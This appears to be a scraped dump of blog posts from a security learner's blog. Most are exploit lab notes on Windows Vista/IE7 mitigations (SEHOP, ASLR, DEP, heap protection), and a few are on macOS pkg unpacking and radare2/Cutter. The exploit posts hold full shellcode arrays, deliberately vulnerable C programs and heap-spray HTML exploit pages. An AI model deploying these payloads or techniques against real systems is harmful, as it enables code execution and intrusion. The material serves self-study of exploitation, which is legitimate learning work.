it doesn\u0026rsquo;t have anything to do with the heap itself\nAttacking the heap using chunk resizing Principle SafeUnlink checks for double-linked table validity when the heap is unloaded from the freelist, but the insertion of a heap chunk into the freelist is not checked\nTiming When the heap block is released from memory, it will be inserted into the empty table If the heap block has more space than the requested space, the remaining space will be inserted into the empty table The insertion process of new chunk Flink: next node; Blink: previous node; see MSDN-NTDEF-LIST\nNew chunk-\u0026gt;Blink = old chunk-\u0026gt;Flink-\u0026gt;Blink old chunk-\u0026gt;Flink-\u0026gt;Blink-\u0026gt;Flink=new chunk Old chunk-\u0026gt;Flink-\u0026gt;Blink=New chunk Just overwrite the Flink pointer of the old chunk with the address and overwrite Blink with the value, and you\u0026rsquo;re ready to DWORDSHOOT again\nCode Unfinished business ","date":"2020-11-28T16:15:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-021-protected-heap/","title":"Exploit learning notes 021 Protected HEAP"},{"content":"Source: Moeomu\u0026rsquo;s blog\nIntroduction The core task of SEHOP is to check the integrity of the S.E.H chain. Before the program turns to exception handling SEHOP checks whether the last exception handling function on the S.E.H chain is the ultimate exception handling function fixed by the system. If yes, it means this S.E.H chain is not broken and the program can go to execute the current exception handling function; if it detects that the last exception handling function is not, it means the S.E.H chain is broken and an S.E.H override attack may have occurred and the program will not go to execute the current exception handling function\nSEHOP validation pseudocode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if (process_flags \u0026amp; 0x40 == 0) // 如果没有SEH记录则不进行检测 { if (record != 0xFFFFFFFF) // 开始检测 { do { if (record \u0026lt; stack_bottom || record \u0026gt; stack_top) // SEH 记录必须位于栈中 goto corruption; if ((char *)record + sizeof(EXCEPTION_REGISTRATION) \u0026gt; stack_top) // SEH 记录结构需完全在栈中 goto corruption; if ((record \u0026amp; 3) != 0) // SEH记录必须4字节对齐 goto corruption; handler = record-\u0026gt;handler; if (handler \u0026gt;= stack_bottom \u0026amp;\u0026amp; handler \u0026lt; stack_top) // 异常处理函数地址不能位于栈中 goto corruption; record = record-\u0026gt;next; } while (record != 0xFFFFFFFF); // 遍历S.E.H链 } if ((TEB-\u0026gt;word_at_offset_0xFCA \u0026amp; 0x200) != 0) { if (handler != \u0026amp;FinalExceptionHandler) // 核心检测，地球人都知道，不解释了 goto corruption; } } Attack ideas Attack the return address If the function has SEHOP enabled but not GS enabled or if the function does not have GS enabled, then directly attack the return address\nAttack the virtual function SEHOP only protects SEH, but it does not protect the dummy function table, so the attack on the dummy function can still be successful\nExploit modules that do not have SEHOP enabled Microsoft has disabled SEHOP for some encryption shells, e.g. Armadilo\nFor example, we can set these two options to 0x53 and 0x52 respectively to simulate a program that has been shelled by Armadilo, so as to Disable SEHOP In Windows 7 and later, the second module pointed to by PEB_LDR_DATA is occupied by KernelBase.dll, so the shellcode should be changed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Shellcode_for_windows7= \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\u0026#34; \u0026#34;\\x8B\\x09\u0026#34; // 在这增加机器码\\x8B\\x09，它对应的汇编为mov ecx,[ecx] \u0026#34;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; ; Fake SEH chain table Prerequisite: ASLR is not enabled\nIdea\nBypass SafeSEH by using SEH_NOSafeSEH_JUMP.dll which is not SafeSEH enabled Bypass SEHOP by forging the S.E.H chain to create the illusion that the S.E.H chain is not broken The test function in SEH_NOSafeSEH has a typical overflow, i.e., it causes a str overflow by copying an extra-long string to str, which in turn overwrites the program\u0026rsquo;s S.E.H information Use the pop pop retn instruction address in SEH_NOSafeSEH_JUMP.DLL to overwrite the address of the exception handling function, and then transfer the program to exception handling by creating a divide-by-0 exception By hijacking the exception handling process, the program is transferred to SEH_NOSaeSEH_JUMP.DLL to execute the pop pop retn instruction, and after executing retn the program is transferred to shellcode for execution. Code\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x14\\xFF\\x12\\x00\u0026#34; // address of last seh record \u0026#34;\\x12\\x10\\x12\\x11\u0026#34; // address of pop pop retn in No_SafeSEH module \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\u0026#34; \u0026#34;\\x8B\\x09\u0026#34; // 在这增加机器码\\x8B\\x09，它对应的汇编为mov ecx,[ecx] \u0026#34;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\u0026#34; \u0026#34;\\xFF\\xFF\\xFF\\xFF\u0026#34; // the fake seh record \u0026#34;\\x75\\xA8\\xF7\\x77\u0026#34; ; DWORD MyException(void) { printf(\u0026#34;There is an exception\u0026#34;); getchar(); return 1; } void test(char * input) { char str[200]; memcpy(str, input, 412); int zero = 0; __try { zero = 1 / zero; } __except(MyException()){} } int main() { HINSTANCE hInst = LoadLibrary(_T(\u0026#34;SEH_NOSaeSEH_JUMP.dll\u0026#34;)); // load No_SafeSEH module char str[200]; test(shellcode); return 0; } ","date":"2020-11-28T15:38:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-020-sehop-introduction/","title":"Exploit learning notes 020 SEHOP introduction"},{"content":"Source: Moeomu\u0026rsquo;s blog\nPrinciple By requesting a large amount of memory, occupying the 0x0C0C0C0C locations in memory, and placing 0x90 and shellcode in these memories, and finally controlling the program to go to 0x0C0C0C0C for execution. As long as the luck is not so bad that 0x0C0C0C0C0C happens to be located somewhere in the shellcode, the shellcode will be executed successfully\nExperiment Preparation Environment: System: Windows Vista SP0, DEP Status: Default, Browser: IE7\nStill use the previously used Vulner_AX.dll as the target of the attack UUID of CVulnerAXCtrl's class information in VulnerAX.idl: ACA3927C-6BD1-4B4E-8697-72481279AAEC Idea We use the Heap spray technique to request 200 1MB memory blocks in memory to counteract the randomization process of ASLR Each memory block contains 0x90 padding and shellcode After Heap spray we occupy the memory near 0x0C0C0C0C, we just control the program to go to 0x0C0C0C0C for execution, and after several 0x90 slides we can reach the shellcode range and execute There is a typical overflow vulnerability in the test function, where the function return address can be overwritten by copying a very long string We will overwrite the function return address as 0x0C0C0C0C, after the function execution returns to execution will be transferred to the memory space we apply Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var nops = unescape(\u0026#34;%u9090%u9090\u0026#34;); var shellcode = \u0026#34;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\u0026#34;; while (nops.length \u0026lt; 0x100000) nops += nops; nops = nops.substring(0, 0x100000/2-32/2-4/2-2/2-shellcode.length); nops = nops + shellcode; var memory = new Array(); for (var i = 0; i \u0026lt; 200; i++) memory[i] += nops; \u0026lt;/script\u0026gt; \u0026lt;object classid=\u0026#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC\u0026#34; id=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;script\u0026gt; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 54) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u0C0C\\u0C0C\u0026#34;; test.test(s); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Result Successful attack on ASLR, as shown in the figure ","date":"2020-11-28T12:38:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-019-using-heapspray-attack-aslr/","title":"Exploit learning notes 019 Using HeapSpray Attack ASLR"},{"content":"Source: Moeomu\u0026rsquo;s blog\nPrinciple The image randomization instructions randomize the full two bytes of the image load base address, the consequence of this is that the springboard is always available, so you can use this to bypass ASLR If you attack memcpy, you can control the return value between 0xXXXX0000 and 0xXXXXFFFF, and if you attack str-like function attacks, you can control the address to one between 0xXXXX0100 and 0xXXXX00FF. Process first find a jmp eax assembly code within the compiled program, followed by the low word of its address as the off by word address, fill in the shellcode Calculate the buffer size, after the overflow will be normal Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;memory.h\u0026gt; char shellcode[] = \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; // payload \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x2A\\x23\u0026#34; // off by word ; char* test() { char tt[256]; memcpy(tt, shellcode, 262); return tt; } int main() { char temp[200]; test(); return 0; } Start experiment Experimental environment: system: Windows Vista SP0, system DEP status: Optin default, compiler: Visual Studio 2008, optimization: disable optimization, GS option: off, DEP option: /NXCOMPAT:NO, build version: release\nCompile the program, run it, the window pops up directly and succeeds, and restart the same, as shown in the picture ","date":"2020-11-26T17:54:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-018-using-partial-overlay-location/","title":"Exploit learning notes 018 using partial overlay location"},{"content":"Source: Moeomu\u0026rsquo;s blog\nIntroduction to ASLR techniques Throughout, all of the previously described vulnerability exploitation methods share a common feature: they all require the identification of a clear jump address. Whether it is a generic springboard instruction such as JMP ESP or the various instructions used by Ret2Libc, we need to determine the entry point of this instruction first. As the saying goes, Microsoft\u0026rsquo;s ASLR (Address Space Layout Randomization) technology is a protection mechanism that interferes with shellcode positioning by no longer using a fixed base address to load the program\nIn fact, the concept of ASLR has been introduced in the Windows XP era, but the ASLR function on XP is very limited, only a simple randomization of PEB and TEB, but no randomization of the module load base address, until Windows Vista appeared, ASLR really began to work!\nSimilar to SafeSEH, ASLR implementation requires both program support and OS support, where program support is not required.\nMicrosoft has added the /dynamicbase linking option since Visual Studio 2005 SP1 to help us with this task. We just need to enable the /ddynmicbase linking option when we compile the program, and the compiled program will support ASLR Image randomization Image randomization is the process of randomizing the virtual address of the PE file loaded when it is mapped to memory, this address is determined at system startup and will change after system reboot Probably for compatibility reasons, Microsoft has set a switch for image randomization in the system, which users can set by setting the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionM anager\\MemoryManagement\\ MoveImages key to set the working mode of image randomization When set to 0, image randomization is disabled When set to -1, randomizable images are forced to be processed with or without the IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE flag set Normal mode of operation when set to other values, only images with the randomized processing flag are processed If MoveImages does not exist in the registry, you can manually create a value with the name MoveImages and the type DWORD and set its value as needed Stack randomization This measure is to randomly select the base address of the stack when the program is running. The difference with image base randomization is that the base address of the stack is not determined when the system is started, but when the program is opened, which means that the base address of the stack is different for any two runs of the same program, and thus the location of each variable in memory is not determined. Compile the following program in VS2008, run it twice on XP and Vista, and get the following result 1 2 3 4 5 6 7 8 9 int main() { char* heap = (char *)malloc(100); char stack[100]; printf(\u0026#34;Address of heap:%#0.4x\\nAddress of stack:%#0.4x\u0026#34;, heap, stack); getchar(); return 0; } As you can see, the heap addresses are far apart on Vista, while they are identical on XP Randomization of PEB and TEB Getting the TEB and PEB of the current process is simple, the TEB is stored at FS:0 and FS:[0x18] and the PEB is stored at the TEB offset 0x30, you can get the TEB and PEB of the current process by the following code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int main() { unsigned int teb; unsigned int peb; __asm { mov eax, FS:[0x18] mov teb, eax mov eax, dword ptr[eax+0x30] mov peb, eax } printf(\u0026#34;PEB:%#x\\nTEB:%#x\u0026#34;, peb, teb); getchar(); return 0; } Test run on Vista, the results are as shown As you can see, the result is very poor, the PEB address is only randomized by one byte, and it is still very regular, the TEB is basically unchanged Defects of ASLR It is not difficult to see that when ASLR randomizes the image, although the module load base address has changed, but the entry point of each module\u0026rsquo;s lower two bytes will not change, for example: the original base address: 0x00401234, after randomization the base address becomes: 0x67291234, so you can use this to attack it Attack the module without ASLR enabled Preparation Experimental environment: Windows Vista SP0, IE7, Adobe Flash Player 9.0.124\nAlthough the book requires the use of version 9.0.262, but I really can not find it, so I will use 9.0.124 instead, click here to download The vulnerable OCX control has already been compiled in the previous experiment, so use that one, click here to download, this control ctrl class object id: ACA3927C-6BD1-4B4E-8697-72481279AAEC Steps Reboot the system to see the ASLR module enabled Experimental control is not enabled GS Load POC page and Flash9k.ocx via IE7 There is a stack overflow vulnerability in the function test, which aims to overwrite the return address of the function Because Flash9k.ocx is not ASLR enabled, the load base address is fixed, so you can search for a suitable springboard instruction inside to jump to shellcode IE7\u0026rsquo;s DEP is turned off, so the impact of DEP is not considered Since the attack is achieved by overwriting the return address of the function, the best springboard instruction is JMP ESP 0x301D606B is also JMP ESP, which will jump to the head of the string after execution, but the problem is that the four bytes of 6B 60 1D 30 constitute exactly one line of assembly instruction imul esp,dword ptr ds:[eax+0x1D],0x30, which will multiply the last two operands and subsequently put them into the first operand So it needs to keep the value of [eax+0x1D] correct, and currently eax is not pointing to a valid address, so it needs to fix eax Unfortunately, there is no suitable instruction for fixing eax, so change the address 0x303911D3 is also JMP ESP, but the assembly code it consists of will read both EC and EAX, so both registers need to be repaired, not feasible, change instruction JMP ESP is not available, use JMP ESI instead, address 0x3000DCD2 contains 0, directly excluded, address 0x302420C3 the last byte is retn, can not be used, excluded, address 0x3028EE6E assembly code will directly cause an exception, excluded, this instruction is also no longer suitable, so look for other suitable instruction The CALL ESP at address 0x300942F2 seems to be suitable, it will also increase the esp by 8 bytes to avoid the garbage data. Here is the shellcode after the change 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;object classid=\u0026#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\u0026#34; codebase=\u0026#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0\u0026#34; width=\u0026#34;160\u0026#34; height=\u0026#34;260\u0026#34;\u0026gt; \u0026lt;param name=\u0026#34;movie\u0026#34; value=\u0026#34;1.swf\u0026#34; /\u0026gt; \u0026lt;param name=\u0026#34;quality\u0026#34; value=\u0026#34;high\u0026#34; /\u0026gt; \u0026lt;embed src=\u0026#34;1.swf\u0026#34; quality=\u0026#34;high\u0026#34; pluginspage=\u0026#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash\u0026#34; type=\u0026#34;application/x-shockwave-flash\u0026#34; width=\u0026#34;160\u0026#34; height=\u0026#34;260\u0026#34;\u0026gt; \u0026lt;/embed\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;object classid=\u0026#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC\u0026#34; id=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;script\u0026gt; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 54) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u42F2\\u3009\u0026#34;; s += \u0026#34;\\u9090\\u9090\u0026#34;; s += \u0026#34;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u616B\\u6F6F\\u4D68\\u7369\\u8B61\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\u0026#34;; test.test(s); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; As shown in the picture, reboot the system, the shellcode runs normally, which means the attack on ASLR is successful ","date":"2020-11-24T21:12:00+08:00","permalink":"https://blog.moeomu.com/posts/exploit-learning-notes-017-aslr-introduction/","title":"Exploit learning notes 017 ASLR Introduction"},{"content":"Source: Moeomu\u0026rsquo;s blog\nCause I couldn\u0026rsquo;t download the ed2k link with motrix, so I was going to download a lite version of Xunlei, and suddenly I found a pkg installer, which piqued my interest.\nAfter Unpacking I\u0026rsquo;ve always wondered what pkg actually runs and what it does, so I started the first step, unpacking Unpacking only requires one command: pkgutil --expand the pkg.pkg that needs to be unpacked Custom unpacking folder name. View I found a Res file with no suffix, so I checked the format with file and found that it was compressed, so I uncompressed it with the unar command and came out with a file of the same name, but with a bigger size right click in finder - open way - archive utility - app was extracted directly Drag this app into /Application and found that it can be used directly, thus completing the task Looked at the other files, there is a Unix executable for opening web pages, probably a promotion, no rogue behavior Result Finish the task Adding iOS app installer exploration After updating the BigSur system, I found that there is such a thing as iOS app installer in the system, but it doesn\u0026rsquo;t work, so I explored it I explored it\nCheck the location of this software, and check the type, it\u0026rsquo;s good, generic, means maybe Intel will be supported in the future? Open Terminal, go to this folder, run the software, error is reported, suggesting that dependency files are needed, as shown in the picture Find the location of the dependency file and find that there seems to be nothing, probably because only the ARM version of the dependency program is available Parallels Desktop cannot be networked solution Still the same problem with BigSur, PD16 is not networked again, so I have no choice but to find a compromise solution Run the command sudo -b /Applications/Parallels\\ Desktop.app/Contents/MacOS/prl_client_app and it will open PD16, so you will be able to connect to the Internet! This command means to run the program with administrator privileges, but in fact, BigSur should have tightened the privileges again, causing problems with PD16 cracking You can write this command in a .command file on your desktop, so that you can double-click it to open it Problem with @ symbol in ls -l Recently, I found that some folders/files are marked with the @ symbol, so I wondered what it meant, so I briefly explored it. Since this phenomenon is caused by the ls program, I asked the system\u0026rsquo;s documentation and commanded man ls. It was quick, and it came out with a snap, as shown in the picture 1 -@ Display extended attribute keys and sizes in long (-l) output. It is very clear that such file/folder has an extended attribute which can be viewed with the xattr -l command This attribute can also be cleaned up completely with xattr -c ","date":"2020-11-24T12:56:00+08:00","permalink":"https://blog.moeomu.com/posts/macos-pkg-file-reverse-analysis/","title":"macOS-pkg file reverse analysis"},{"content":"Source: Moeomu\u0026rsquo;s blog\nIntroduction Radare2 r2 is a rewrite from scratch of radare in order to provide a set of libraries and tools to work with binary files.\nRadare project started as a forensics tool, a scriptable command-line hexadecimal editor able to open disk files, but later added support for analyzing binaries, disassembling code, debugging programs, attaching to remote gdb servers\u0026hellip;\nradare2 is portable.\nTo learn more you may read the official radare2 book, the source code, or browse the web for blog posts or presentations from r2con.\nCutter Cutter is a free and open-source reverse engineering framework powered by radare2 . Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineers. Installation Since Cutter is a GUI-based program for Radare2, you only need to download Cutter\nThis test system: macOS Catalina 10.15.7 Github download link: github.com/radareorg/cutter/releases Moeomu netdisk download link (may not be the latest): Cutter-v1.12.0-x64.dmg The reason why macOS Catalina can\u0026rsquo;t run Cutter I don\u0026rsquo;t know about Windows, but it doesn\u0026rsquo;t work properly on macOS Catalina after installation anyway, the solution is as follows\nFind out the reason why it doesn\u0026rsquo;t work properly Go to Cutter\u0026rsquo;s folder: cd /Applications/Cutter.app/Contents/MacOS/ Run Cutter directly to see the cause: . /Cutter Install gettext to solve the problem: brew install gettext ","date":"2020-11-21T19:04:00+08:00","permalink":"https://blog.moeomu.com/posts/reverse-tools-radare2-and-cutter/","title":"Reverse Tools Radare2 and Cutter"},{"content":"Source: Moeomu\u0026rsquo;s Blog\nExploit executable memory to attack DEP Principle Sometimes there is a readable, writable and executable section of memory in the process memory space, if we can copy the shellcode into this memory and hijack the program flow, our shellcode will have the chance to execute Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;......\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x8A\\x17\\x84\\x7C\u0026#34;//pop eax retn \u0026#34;\\x0B\\x1A\\xBF\\x7C\u0026#34;//pop pop retn 